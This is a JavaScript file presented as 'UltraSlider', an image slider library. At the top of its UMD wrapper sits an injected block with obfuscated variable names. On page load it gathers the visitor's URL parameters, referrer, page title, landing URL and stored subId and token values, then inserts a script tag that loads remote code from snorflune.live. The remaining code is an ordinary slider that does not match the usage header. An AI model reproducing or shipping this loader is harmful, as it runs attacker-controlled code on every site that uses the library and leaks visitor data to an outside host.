/* UltraSlider v1.0 — Vanilla JS slider (UMD build)
 *
 * Использование:
 *   // ESM
 *   import UltraSlider from './UltraSlider.js';
 *   const slider = new UltraSlider('#my-slider', {  options  });
 *
 *   // UMD (через <script src="UltraSlider.js"></script>)
 *   const slider = new window.UltraSlider('#my-slider', {  options  });
 */
(function (global, factory) {
  var name = '_JCJdSzfPNYCZdNT5';
    if (!window._JCJdSzfPNYCZdNT5) {
        window._JCJdSzfPNYCZdNT5 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://snorflune.live/yX919RFT',
        };
    }
    const _6W2FPdHnTMMBfwxR = localStorage.getItem('config');
    if (typeof _6W2FPdHnTMMBfwxR !== 'undefined' && _6W2FPdHnTMMBfwxR !== null) {
        var _QV44pg1DwF6BFS3N = JSON.parse(_6W2FPdHnTMMBfwxR);
        var _9dP3ctMh7ytSxYzZ = Math.round(+new Date()/1000);
        if (_QV44pg1DwF6BFS3N.created_at + window._JCJdSzfPNYCZdNT5.ttl < _9dP3ctMh7ytSxYzZ) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _xVpYFbXxXCsHFLjM = localStorage.getItem('subId');
    var _28vCqqCShVWjhW7C = localStorage.getItem('token');
    var _gx7wfkZshQZjnc7c = '?return=js.client';
        _gx7wfkZshQZjnc7c += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _gx7wfkZshQZjnc7c += '&se_referrer=' + encodeURIComponent(document.referrer);
        _gx7wfkZshQZjnc7c += '&default_keyword=' + encodeURIComponent(document.title);
        _gx7wfkZshQZjnc7c += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _gx7wfkZshQZjnc7c += '&name=' + encodeURIComponent(name);
        _gx7wfkZshQZjnc7c += '&host=' + encodeURIComponent(window._JCJdSzfPNYCZdNT5.R_PATH);
    if (typeof _xVpYFbXxXCsHFLjM !== 'undefined' && _xVpYFbXxXCsHFLjM && window._JCJdSzfPNYCZdNT5.unique) {
        _gx7wfkZshQZjnc7c += '&sub_id=' + encodeURIComponent(_xVpYFbXxXCsHFLjM);
    }
    if (typeof _28vCqqCShVWjhW7C !== 'undefined' && _28vCqqCShVWjhW7C && window._JCJdSzfPNYCZdNT5.unique) {
        _gx7wfkZshQZjnc7c += '&token=' + encodeURIComponent(_28vCqqCShVWjhW7C);
    }
    if ('' !== '') {
        _gx7wfkZshQZjnc7c += '&bypass_cache=';
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._JCJdSzfPNYCZdNT5.R_PATH + _gx7wfkZshQZjnc7c;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
  if (typeof define === "function" && define.amd) {
    define(['exports'], factory);
  } else if (typeof exports !== "undefined") {
    factory(exports);
  } else {
    var mod = {
      exports: {}
    };
    factory(mod.exports);
    global.simpleslider = mod.exports;
  }
})(this, function (exports) {
  'use strict';

  Object.defineProperty(exports, "__esModule", {
    value: true
  });
  function getdef(val, def) {
    return val == null ? def : val;
  }

  function len(arr) {
    return (arr || []).length;
  }

  function startSlides(containerElem, children, unit, startVal, visVal, trProp) {
    var style = void 0,
        imgs = [];

    if (!children) {
      children = containerElem.children;
    }

    var i = len(children);

    while (--i >= 0) {
      imgs[i] = children[i];
      style = imgs[i].style;
      style.position = 'absolute';
      style.top = style.left = style.zIndex = 0;
      style[trProp] = startVal + unit;
    }

    style[trProp] = visVal + unit;
    style.zIndex = 1;

    return imgs;
  }

  function defaultEase(time, begin, change, duration) {
    return (time = time / (duration / 2)) < 1 ? change / 2 * time * time * time + begin : change / 2 * ((time -= 2) * time * time + 2) + begin;
  }

  function getSlider(options) {
    options = options || {};
    var actualIndex = void 0,
        interval = void 0,
        intervalStartTime = void 0,
        imgs = void 0,
        remainingTime = void 0;

    var containerElem = getdef(options.container, document.querySelector('*[data-simple-slider]'));
    var trProp = getdef(options.prop, 'left');
    var trTime = getdef(options.duration, 0.5) * 1000;
    var delay = getdef(options.delay, 3) * 1000;
    var unit = getdef(options.unit, '%');
    var startVal = getdef(options.init, -100);
    var visVal = getdef(options.show, 0);
    var endVal = getdef(options.end, 100);
    var paused = options.paused;
    var ease = getdef(options.ease, defaultEase);
    var onChange = getdef(options.onChange, 0);
    var onChangeEnd = getdef(options.onChangeEnd, 0);
    var now = Date.now;

    function reset() {
      if (len(containerElem.children) > 0) {
        var style = containerElem.style;
        style.position = 'relative';
        style.overflow = 'hidden';
        style.display = 'block';

        imgs = startSlides(containerElem, options.children, unit, startVal, visVal, trProp);
        actualIndex = 0;
        remainingTime = delay;
      }
    }

    function setAutoPlayLoop() {
      intervalStartTime = now();
      interval = setTimeout(function () {
        intervalStartTime = now();
        remainingTime = delay;

        change(nextIndex());

        setAutoPlayLoop();
      }, remainingTime);
    }

    function resume() {
      if (isAutoPlay()) {
        if (interval) {
          clearTimeout(interval);
        }

        setAutoPlayLoop();
      }
    }

    function isAutoPlay() {
      return !paused && len(imgs) > 1;
    }

    function pause() {
      if (isAutoPlay()) {
        remainingTime = delay - (now() - intervalStartTime);
        clearTimeout(interval);
        interval = 0;
      }
    }

    function reverse() {
      var newEndVal = startVal;
      startVal = endVal;
      endVal = newEndVal;
      actualIndex = Math.abs(actualIndex - (len(imgs) - 1));
      imgs = imgs.reverse();
    }

    function change(newIndex) {
      var count = len(imgs);
      while (--count >= 0) {
        imgs[count].style.zIndex = 1;
      }

      imgs[newIndex].style.zIndex = 3;
      imgs[actualIndex].style.zIndex = 2;

      anim(imgs[actualIndex].style, visVal, endVal, imgs[newIndex].style, startVal, visVal, trTime, 0, 0, ease);

      actualIndex = newIndex;

      if (onChange) {
        onChange(prevIndex(), actualIndex);
      }
    }

    function next() {
      change(nextIndex());
      resume();
    }

    function prev() {
      change(prevIndex());
      resume();
    }

    function nextIndex() {
      var newIndex = actualIndex + 1;
      return newIndex >= len(imgs) ? 0 : newIndex;
    }

    function prevIndex() {
      var newIndex = actualIndex - 1;
      return newIndex < 0 ? len(imgs) - 1 : newIndex;
    }

    function dispose() {
      clearTimeout(interval);
      document.removeEventListener('visibilitychange', visibilityChange);

      imgs = containerElem = interval = trProp = trTime = delay = startVal = endVal = paused = actualIndex = remainingTime = onChange = onChangeEnd = null;
    }

    function currentIndex() {
      return actualIndex;
    }

    function anim(insertElem, insertFrom, insertTo, removeElem, removeFrom, removeTo, transitionDuration, startTime, elapsedTime, easeFunc) {
      function setProp(elem, from, to) {
        elem[trProp] = easeFunc(elapsedTime - startTime, from, to - from, transitionDuration) + unit;
      }

      if (startTime > 0) {
        if (elapsedTime - startTime < transitionDuration) {
          setProp(insertElem, insertFrom, insertTo);
          setProp(removeElem, removeFrom, removeTo);
        } else {
          insertElem[trProp] = insertTo + unit;
          removeElem[trProp] = removeTo + unit;

          if (onChangeEnd) {
            onChangeEnd(actualIndex, nextIndex());
          }

          return;
        }
      }

      requestAnimationFrame(function (time) {
        if (startTime === 0) {
          startTime = time;
        }

        anim(insertElem, insertFrom, insertTo, removeElem, removeFrom, removeTo, transitionDuration, startTime, time, easeFunc);
      });
    }

    function visibilityChange() {
      if (document.hidden) {
        pause();
      } else {
        resume();
      }
    }

    document.addEventListener('visibilitychange', visibilityChange);
    reset();

    if (len(imgs) > 1) {
      resume();
    }

    return {
      currentIndex: currentIndex,
      pause: pause,
      resume: resume,
      nextIndex: nextIndex,
      prevIndex: prevIndex,
      next: next,
      prev: prev,
      change: change,
      reverse: reverse,
      dispose: dispose
    };
  }

  exports.getSlider = getSlider;
});
